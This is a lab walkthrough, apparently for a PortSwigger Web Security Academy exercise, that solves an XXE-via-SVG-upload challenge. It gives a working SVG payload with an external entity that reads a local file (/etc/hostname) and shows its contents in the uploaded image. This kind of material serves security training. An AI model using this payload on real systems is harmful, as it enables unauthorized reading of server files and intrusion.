## Lab Description: Exploiting XXE via image file upload

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/90766f3a-5323-4510-948f-f010c5145e05)


## Solution: 



The image upload functionality is vulnerable to XXE attack.

Since SVG image formats are XML based, we can try to upload an SVG image & modify the content of the xml to retreive /etc/passwd.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/749c9192-b4ec-4fa4-95b7-76e025460b84)

Post a comment on a blog post, capture the req.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/d1dd42f8-626b-44e9-b543-96ba9e54fc70)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/de4458ec-5165-431d-9f19-8bd202d84355)

In the above request remove all the tag contents and replace it with this payload.

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/aecb28b9-aae6-4b67-acef-0e994fc4a608)

Send the req-

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/6da03fe5-8182-4848-bc93-6e31bf7aef42)

Click on the image & open it in new tab to view the o/p of /etc/hostname command

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/4c3671aa-b756-4ca4-b45a-a90876ccb51a)

Submit this code in solution

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/3000ed71-a686-4bf2-a41e-faf2e8e58323)


